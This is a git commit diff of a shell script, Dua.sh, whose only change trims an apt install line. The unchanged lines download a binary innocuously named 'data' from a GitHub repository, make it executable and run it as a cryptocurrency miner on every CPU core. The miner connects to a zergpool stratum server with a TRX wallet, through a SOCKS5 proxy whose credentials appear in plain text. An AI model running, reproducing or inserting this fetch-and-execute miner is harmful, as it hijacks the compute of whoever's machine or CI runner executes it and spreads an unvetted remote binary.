309f6401371eb31f835d2479f47084a88ff17427
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-27 10:36:48 +0700

    Update Dua.sh

--- Dua.sh
+++ Dua.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-apt update -y && apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+apt update -y
 wget -q https://github.com/thirthada007/DevOps/raw/main/data
 chmod +x data
 ./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://lwnyzqkn:zcw4kwul3yqj@45.136.228.85:6140
